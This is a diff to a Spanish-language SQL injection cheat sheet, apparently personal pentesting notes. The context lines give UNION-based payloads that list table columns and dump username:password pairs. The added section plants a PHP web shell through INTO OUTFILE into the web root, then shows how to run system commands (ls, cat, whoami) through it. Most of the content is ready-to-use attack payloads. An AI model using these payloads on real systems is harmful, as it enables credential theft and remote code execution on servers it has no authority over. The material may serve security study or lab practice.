@@ -160,7 +160,28 @@ SELECT username,password FROM users UNION SELECT NULL,username||':'||password FR
 ```SQL
 ' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name=''-- -
 ```
-+ Ver los datos de cada columna}
++ Ver los datos de cada columna
 ```SQL
 ' UNION SELECT NULL,username||':'||password FROM nombre_tabla-- -
 ```
+---
+### Ejecución remota SQLi
+1er paso:
+```sql
+' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shellsqli.php'-- -
+```
+2do paso:
+```shell
+http://SERVER_IP:PORT/shellsqli.php?0=id
+```
+
+| Comandos |
+| :------: |
+|    ls    |
+|   cat    |
+|   pwd    |
+|    id    |
+|  whoami  |
+|  ls ..   |
+| ls /file |
+| ls /dir  |
